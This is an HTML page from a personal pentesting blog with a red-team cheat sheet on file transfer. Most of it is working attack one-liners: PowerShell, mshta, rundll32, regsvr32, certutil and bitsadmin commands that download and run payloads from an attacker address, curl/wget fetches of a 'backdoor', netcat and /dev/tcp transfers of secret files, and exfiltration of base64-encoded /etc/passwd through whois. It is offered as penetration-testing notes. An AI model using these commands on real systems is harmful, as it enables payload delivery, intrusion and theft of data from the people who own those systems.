@@ -1,0 +1,208 @@
+<!DOCTYPE HTML>
+<!--
+	Iridium by TEMPLATED
+    templated.co @templatedco
+    Released for free under the Creative Commons Attribution 3.0 license (templated.co/license)
+-->
+<html>
+	<head>
+		<title>NutCrackers Security</title>
+		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+		<meta name="description" content="" />
+		<meta name="keywords" content="" />
+		<link href='http://fonts.googleapis.com/css?family=Arimo:400,700' rel='stylesheet' type='text/css'>
+		<!--[if lte IE 8]><script src="js/html5shiv.js"></script><![endif]-->
+
+			<link rel="stylesheet" href="css/skel-noscript.css" />
+			<link rel="stylesheet" href="css/posts.css" />
+			<link rel="stylesheet" href="css/style-desktop.css" />
+		<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
+		<!--[if lte IE 9]><link rel="stylesheet" href="css/ie/v9.css" /><![endif]-->
+		<!--<link rel="stylesheet" href="styles/ocean.css">-->
+		<link rel="stylesheet" href="styles/srcery.css">
+		<script src="highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+	</head>
+	<body class="homepage">
+
+		<!-- Header -->
+		<div>
+			<div class="container">
+
+				<!-- Logo -->
+				<div>
+					<ul class="default">
+						<li><a href="index.html">Home</a></li>
+						<li><a href="blog.html">Blog</a></li>
+						<li><a href="archive.html">Archive</a></li>
+					</ul>
+				</div>
+
+				<!-- Nav -->
+			</div>
+		</div>
+
+		<!-- Main -->
+		<div id="main">
+			<div class="container">
+				<div class="row">
+
+					<!-- Content -->
+					<div id="content" class="8u skel-cell-important">
+						<section>
+							<header>
+									<span class="byline"><a href="Transfer.html"><b>File Transfer in Red Team/Penetration Testing</a></b></span>
+	                <img src="imagini/transfer.png" alt="" style="height:275px;width:580px;" />
+	              <p>Hi everyone, it's been a while since I've written on this blog. In this article I set out to share some notes I took while pentesting. These notes are for the transfer of files between workstations. The first time I will explain briefly what is happening. This file transfer technique is used in penetration testing. An attacker can transmit certain malicious files to a server, or leak important data. Below you will see some methods to do this.</p>
+
+
+	              <h1>Build and HTTP Server with python2/3</h1>
+	              <p><pre><code>python -m SimpleHTTPServer 1337</pre></code></p>
+	            <p>The above command will start the HTTP service in the current directory, the port is 1337.</p>
+	            <p><pre><code>python3 -m http.server 1337</pre></code></p>
+	            <h1>Build and HTTP Server with PHP</h1>
+	            <p>When the PHP version is greater than 5.4, you can use PHP to start the HTTP service in the current directory, the port is 1337.</p>
+	            <p><pre><code>php -S 0.0.0.0:1337</pre></code></p>
+	            <h1>Build and HTTP Server with RUBY</h1>
+	            <p><pre><code>ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd</pre></code></p>
+	            <p><pre><code>ruby -run -e httpd . -p 1337</pre></code></p>
+	            <h1>Build and HTTP Server with PERL</h1>
+	            <p><pre><code>perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount</pre></code></p>
+	            <p><pre><code>perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |"</pre></code></p>
+	            <h1>Build and HTTP Server with BUSYBOX</h1>
+	            <p><pre><code>busybox httpd -f -p 8000</pre></code></p>
+
+	            <h1>Download Files from HTTP server</h1>
+	            <p></p>
+	            <p>For Windows we have:</p>
+	            <p><pre><code>powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.xxx.xxx.x/payload.ps1')|iex"</pre></code></p>
+	            <p><pre><code>mshta vbscript:Close(Execute("GetObject(""script:http://192.xxx.xxx.x/payload.sct"")"))</pre></code></p>
+	            <p><pre><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://192.xxx.xxx.x/payload.sct");window.close();</pre></code></p>
+	            <p><pre><code>wmic os get /format:"https://192.xxx.xxx.x/payload.xsl"</pre></code></p>
+	            <p><pre><code>regsvr32 /u /n /s /i:http://192.xxx.xxx.x/payload.sct scrobj.dll</pre></code></p>
+	            <p><pre><code>certutil -urlcache -split -f http://192.xxx.xxx.x/payload payload</pre></code></p>
+	            <p><pre><code> bitsadmin /transfer n http://1.2.3.4/5.exe</pre></code></p>
+
+	            <p>Now for Linux we have:</p>
+
+	            <p><pre><code>curl http://1.2.3.4/backdoor</pre></code></p>
+	            <p><pre><code>wget http://1.2.3.4/backdoor</pre></code></p>
+	            <p><pre><code>awk 'BEGIN {
+	RS = ORS = "\r\n"
+	HTTPCon = "/inet/tcp/0/127.0.0.1/1337"
+	print "GET /your_file_here HTTP/1.1\r\nConnection: close\r\n"    |& HTTPCon
+	while (HTTPCon |& getline > 0)
+	print $0
+	close(HTTPCon)
+	}'</pre></code></p>
+	<p>HTTP server with PUT request in ngix</p>
+	<p><pre><code>mkdir -p /var/www/upload/ #Create directory
+	chown www-data:www-data /var/www/upload/ # Modify the user and group to which the
+	cd /etc/nginx/sites-available # Enter the nginx virtual host directory
+	# Write configuration to file_upload file
+	cat <<EOF > file_upload
+	server {
+	    listen 8001 default_server;
+	    server_name kali;
+	        location / {
+	        root / var / www / upload;
+	        dav_methods PUT;
+	    }
+	}
+	EOF
+	    #Write completed
+	cd ../sites-enable # Enter the nginx virtual host startup directory
+	ln -s /etc/nginx/sites-available/file_upload file_upload # Enable file_upload vir
+	systemctl start nginx # start Nginx</pre></code></p>
+	<p>File receiving end:</p>
+	<p><pre><code>nc -lvnp 1337 > secret.txt </pre></code></p>
+	<p>File sender:</p>
+	<p><pre><code>cat secret.txt > /dev/tcp/ip/port</pre></code></p>
+	<p>Listen port 1337</p>
+	<p><pre><code> nc -vlnp 1337 | sed "s/ //g" | base64 -d</pre></code></p>
+	<p><img src="imagini/nc.png" style="height:375px;width:580px;"></p>
+	<p><pre><code> whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64`</pre></code></p>
+	<p><img src="imagini/whois.png" style=></p>
+	<p>Wait few second and all info will be displayed</p>
+	<p><img src="imagini/display.png" ></p>
+	<p>File transfer with netcat</p>
+	<p>Accept end</p>
+	<p><pre><code> nc -l -p 1337 > 1.txt</pre></code></p>
+	<p>Sending end</p>
+	<p><pre><code>cat 1.txt | nc -l -p 1337</pre></code></p>
+	<p><pre><code>nc 10.10.10.200 1337 < 1.txt</pre></code></p>
+
+
+	<p>Upload file with HTTP PUT server</p>
+	<p><pre><code>curl --upload-file secret.txt http://ip:port/</pre></code></p>
+	<p><pre><code>wget --method=PUT --post-file=secret.txt http://ip:port</pre></code></p>
+
+	<p>I hope you like this article about File Transfer and sorry for my bad English, I am not a native speaker (Happy Hack)</p>
+
+	<h1><b>References!!</b></h1>
+	<p><a href="http://sweetme.at/2013/08/28/simple-local-http-server-with-ruby/" >http://sweetme.at/2013/08/28/simple-local-http-server-with-ruby/</a></p>
+	<p><a href="https://gist.github.com/willurd/5720255" >https://gist.github.com/willurd/5720255</a></p>
+	<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/" >https://3gstudent.github.io/3gstudent.github.io/</a></p>
+
+
+
+						</section>
+					</div>
+
+					<!-- Sidebar -->
+					<div id="sidebar" class="4u">
+						<section>
+							<header>
+								<h2>Blog posts</h2>
+							</header>
+							<ul class="style">
+								<li>
+
+									<p class="posted">February 6, 2021 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Transfer.html">File Transfer In Red Team/Penetration Testing</a></p>
+									<p class="posted">January 15, 2020 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="PE-file.html">PE Portable Executable File Format</a></p>
+									<p class="posted">November 14, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="crack.html">Cracking The PassFab RAR Software</a></p>
+									<p class="posted">March 3, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Forensics.html">Volatility: Extract Password From RAM</a></p>
+									<p class="posted">February 28, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows6.html">Windows Exploit Development Part VI</a></p>
+									<p class="posted">February 16, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows5.html">Windows Exploit Development Part V</a></p>
+									<p class="posted">January 22, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows4.html">Windows Exploit Development Part IV</a></p>
+									<p class="posted">January 16, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows3.html">Windows Exploit Development Part III</a></p>
+									<p class="posted">January 16, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Windows2.html">Windows Exploit Development Part II</a></p>
+									<p class="posted">January 1, 2019 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="WED.html">Windows Exploit Development Part I</a></p>
+									<p class="posted">December 11, 2018 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Shellcode1.html">How to create your shellcode part II</a></p>
+									<p class="posted">January 9, 2018 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Shellcode.html">How to create your own shellcode part I</a></p>
+									<p class="posted">January 4, 2018 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Ubuntu.html">The Linux Commands you should NEVER use</a></p>
+									<p class="posted">January 3, 2018 </p>
+									<p class="text" style="bottom:10px; position: relative"><a href="Nmap.html">Nmap Firewall Scan</a></p>
+								</li>
+							</ul>
+						</section>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Footer -->
+
+		<!-- Copyright -->
+		<div id="copyright">
+			<div class="container">
+					Copyright &copy 2021 T3jv1l. All Rights Reserved. Created and designed by Mr.Leritaite.
+			</div>
+		</div>
+
+	</body>
+</html>
